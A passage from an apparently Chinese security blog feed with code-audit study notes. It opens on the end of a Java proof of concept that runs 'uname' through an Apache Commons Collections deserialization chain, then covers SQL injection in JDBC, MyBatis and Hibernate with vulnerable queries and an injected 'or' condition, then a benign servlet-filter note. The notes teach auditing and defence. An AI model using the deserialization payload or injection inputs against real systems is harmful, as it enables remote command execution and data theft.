punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">File</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里执行的命令是 uname，运行代码可以看到报错信息里显示了 Darwin，说明命令被成功执行了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111211611336.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这样就利用代码注入实现了 Apache Commons collections 反序列化漏洞有回显的利用。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/vuls/251664.html">https://www.freebuf.com/vuls/251664.html</a></p><p><a href="https://www.anquanke.com/post/id/224487">https://www.anquanke.com/post/id/224487</a></p><p><a href="https://blog.csdn.net/Candyys/article/details/106006282">https://blog.csdn.net/Candyys/article/details/106006282</a></p><p><a href="https://blog.csdn.net/java276582434/article/details/90550578">https://blog.csdn.net/java276582434/article/details/90550578</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】SQL 注入</title>
      <link href="//211117-091653.html"/>
      <url>//211117-091653.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-JDBC-拼接不当造成-SQL-注入"><a href="#0x01-JDBC-拼接不当造成-SQL-注入" class="headerlink" title="0x01 JDBC 拼接不当造成 SQL 注入"></a>0x01 JDBC 拼接不当造成 SQL 注入</h1><p>JDBC 有两种方法执行 SQL 语句，分别为 PrepareStatement 和 Statement，两个方法的区别在于 PrepareStatement 会对 SQL 语句进行预编译，而 Statement 在每次执行时都需要编译，会增大系统开销。</p><p>理论上 PrepareStatement 的效率和安全性会比 Statement 好，但不意味着就不会存在问题。</p><p>以下是一个使用 Statement 执行 SQL 语句的示例</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Statement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Statement</span> st <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里如果输入的 id 为 1 or 1 = 2，那么 SQL 语句就会被拼接为 select * from user where id = 1 or 1 = 2，改变了想要查询 id = 1 的语义。 </p><p>PreqareStatement 方法支持使用 ? 对变量位进行占位，在预编译阶段填入相应的值会构造出完整的 SQL 语句，从而避免 SQL 注入的产生。</p><p>但开发有时为了便利，会直接采取拼接的方式构造 SQL 语句，这样一来依然会存在 SQL 注入，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pst <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pst<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时如果使用 or 1 = 1 仍然可以判断存在 SQL 注入，但是如果使用 ? 作为占位符，填入的字段的值就会进行严格的类型检查，就可以有效的避免 SQL 注入的产生，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id = ?"</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pstt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 参数已经强制要求是整型</span>    pstt<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pstt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-框架使用不当造成-SQL-注入"><a href="#0x02-框架使用不当造成-SQL-注入" class="headerlink" title="0x02 框架使用不当造成 SQL 注入"></a>0x02 框架使用不当造成 SQL 注入</h1><p>通常框架底层已经实现了对 SQL 注入的防御，但是如果在开发未能恰当的使用框架的情况下，依然会存在 SQL 注入的风险。</p><h2 id="1、MyBatis-框架"><a href="#1、MyBatis-框架" class="headerlink" title="1、MyBatis 框架"></a>1、MyBatis 框架</h2><p>MyBatis 的思想是将 SQL 语句编入配置文件中，避免 SQL 语句在代码中大量出现，方便对 SQL 语句的修改和配置。</p><p>MyBatis 使用 parameterType 向 SQL 语句传参，在 SQL 引用传参的时候可以使用 #{} 和 ${} 两种方式，两种方式区别如下：</p><p>${}：SQL 拼接符号，直接将输入的语句拼接到 SQL 语句里，想避免 SQL 注入问题需要手动添加过滤</p><p>#{}：占位符号，在对数据解析时会自动将输入的语句前后加上单引号从而避免 SQL 注入</p><p>也就是说在 MyBatis 框架中，如果使用了 ${} 方法，同时又没有进行过滤就会产生 SQL 注入，而使用 #{} 方法时可以避免 SQL 注入。</p><h2 id="2、Hibernate-框架"><a href="#2、Hibernate-框架" class="headerlink" title="2、Hibernate 框架"></a>2、Hibernate 框架</h2><p>Hibernate 是现今主流的 Java 数据库持久化框架，采用 Hibernate 查询语句（HQL）注入。</p><p>HQL 查询语句来自 Hibernate 引擎进行解析，因此产生的错误可能来自数据库，也有可能来自 Hibernate 引擎。 </p><p>HQL 和 SQL 的区别：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111172027760.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>HQL 注入和 SQL 注入的成因都一样，使用拼接 HQL 语句的写法可能会导致 SQL 注入</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Query</span> query <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span><span class="token string">"from User where name='"</span><span class="token operator">+</span>queryString<span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是受语法影响，HQL注入在漏洞利用上有一定的限制，比如不能利用联合查询、不能跨库查表、执行命令等。</p><p>对于 Hibernate 的注入，这里只作为简单了解一下，平时代审的时候注意一下即可。</p><blockquote><p>参考文章：</p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://www.redhatzone.com/ask/article/1448.html</a></p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://blog.csdn.net/qq_36594628/article/details/119461996</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Java Web 过滤器-filter</title>
      <link href="//211116-112510.html"/>
      <url>//211116-112510.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>filter 被称为过滤器，是 Servlet 2.3 新增的一个特性，同时也是 Serlvet 技术中最实用的技术。</p><p>过滤器实际上就是对 Web 资源进行拦截，做一些处理后再交给下一个过滤器或 Servlet 处理，通常都是用来拦截 request 进行处理的，也可以对返回的 response 进行拦截处理。</p><p>开发人员利用 filter 技术，可以实现对所有 Web 资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><h1 id="0x01-filter-的配置"><a href="#0x01-filter-的配置" class="headerlink" title="0x01 filter 的配置"></a>0x01 filter 的配置</h1><p>filter 的配置类似于 Servlet，由 filter 和 filter-mapping 两组标签组成，和 Servlet 一样，如果版本大于 3.0 也可以使用注解的方式来配置 filter</p><h2 id="1、基于-web-xml-的配置"><a href="#1、基于-web-xml-的配置" class="headerlink" title="1、基于 web.xml 的配置"></a>1、基于 web.xml 的配置</h2><p>以下是一个基于 web.xml 的配置内容</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.sec.test.test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>标签含义如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;filter&gt; 指定一个过滤器&lt;filter-name&gt; 为过滤器指定一个名称，该项不能为空&lt;filter-class&gt; 用于指定过滤器的完整的限定类名&lt;init-param&gt; 用于为过滤器指定初始化参数  &lt;param-name&gt; 为 &lt;init-param&gt; 的子参数，用于指定参数的名称  &lt;param-value&gt; 为 &lt;init-param&gt; 的子参数，用于指定参数的值&lt;filter-mapping&gt; 用于设置一个 filter 负责拦截的资源  &lt;filer-name&gt; 为 &lt;filer-mapping&gt; 的子参数，用于设置 filter 的注册名称，该值必须是在 &lt;filter&gt; 元素中声明过的过滤器的名称  &lt;url-pattern&gt; 用于设置 filter 所拦截的请求路径&lt;servlet-name&gt; 用于指定过滤器所拦截的 Servlet 名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、基于注解的方法"><a href="#2、基于注解的方法" class="headerlink" title="2、基于注解的方法"></a>2、基于注解的方法</h2><p>示例代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"this is filter test"</span><span class="token punctuation">,</span>urlPatterns<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"/filterTest"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> filterTest <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*销毁时调用*/</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交给下一个过滤器或servlet处理</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与 Servlet 一样，使用 web.xml 可以配置的 filter 属性也都可以使用注解进行配置，但一般不推荐使用注解配置，因为使用 web.xml 可以控制过滤器的执行顺序，而使用注解的方式则不行。</p><h1 id="0x02-filter-的流程"><a href="#0x02-filter-的流程" class="headerlink" title="0x02 filter 的流程"></a>0x02 filter 的流程</h1><p>filter 的流程很简单，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">用户向服务器发送请求|服务器|filter 1|......|filter n|service()方法|filter n|......|filter 1|服务器|服务器返回结果给用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先用户向服务器发起请求，之后请求经过过滤器到达 Servlet 中的 service() 方法，最后再经过过滤器返回给用户。</p><p>这里值得注意的是过滤器在接收请求和返回请求的时候顺序是相反的。</p><h1 id="0x03-filter-的接口方法"><a href="#0x03-filter-的接口方法" class="headerlink" title="0x03 filter 的接口方法"></a>0x03 filter 的接口方法</h1><p>filter 接口方法如下：</p><h2 id="1、init-接口"><a href="#1、init-接口" class="headerlink" title="1、init() 接口"></a>1、init() 接口</h2><p>该接口与 Servlet 里的 init() 方法类似，主要用来初始化过滤器。如果初始化代码中要用到 FilterConfig 对象，那这些初始化代码只能在 filter 的 init() 方法中编写。</p><p>init() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、doFilter-接口"><a href="#2、doFilter-接口" class="headerlink" title="2、doFilter() 接口"></a>2、doFilter() 接口</h2><p>doFilter 方法类似于 Servlet 接口的 service() 方法，filter 通过该接口实现具体的过滤操作，当客户请求访问与过滤器关联的 URL 的时候，Servlet 过滤器将先执行doFilter 方法，FilterChain 参数用于访问后续过滤器。</p><p>doFilter() 方法定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交给下一个过滤器或servlet处理</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、destroy-接口"><a href="#3、destroy-接口" class="headerlink" title="3、destroy() 接口"></a>3、destroy() 接口</h2><p>destroy() 接口和 servlet 里的 destroy() 作用类似，用于释放被 filter 打开的资源，如关闭数据库等。</p><p>destroy() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*销毁时调用*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x04-filter-的生命周期"><a href="#0x04-filter-的生命周期" class="headerlink" title="0x04 filter 的生命周期"></a>0x04 filter 的生命周期</h1><p>filter 的生命周期与 servlet 的生命周期比较类似，如下图所示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111161127002.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当 Web 容器启动时，会根据 web.xml 中声明的 filter 顺序依次实例化这些 filter。</p><p>这里会根据实际情况的不同，doFilter() 方法可能会被调用多次，最后当程序关闭或者卸载时调用 destroy() 方法。</p><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/Soinice/article/details/82787964">https://blog.csdn.net/Soinice/article/details/82787964</a></p><p><a href="https://www.cnblogs.com/tanghaorong/p/12811457.html">https://www.cnblogs.com/tanghaorong/p/12811457.html</a></p><p><a href="https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912">https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Java Web 核心技术-Servlet</title>
      <link href="//211115-165745.html"/>
      <url>//211115-165745.html</url>
      
